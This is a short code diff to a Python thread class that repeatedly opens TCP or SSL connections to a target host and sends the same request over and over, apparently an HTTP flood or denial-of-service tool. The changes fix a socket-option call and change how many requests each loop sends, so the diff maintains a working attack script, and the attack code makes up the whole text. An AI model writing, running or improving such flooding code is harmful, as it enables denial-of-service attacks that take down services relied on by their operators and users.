@@ -123,7 +123,7 @@ class tembusbrokenhome(threading.Thread):
         while mulai:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.setsockopt(socket.TCP_NODELAY, socket.IPPROTO_TCP, 1)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.connect((str(host_url), int(vport)))
                 if str(port) == '443':
                     s = ssl.wrap_socket(s)
@@ -148,7 +148,7 @@ class tembusbrokenhome(threading.Thread):
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
                 s.sendall(str.encode(request))
-                for y in range(threads*1024):
+                for y in range(threads*threads):
                     s.send(str.encode(request))
                     s.sendall(str.encode(request))
                 i+=1
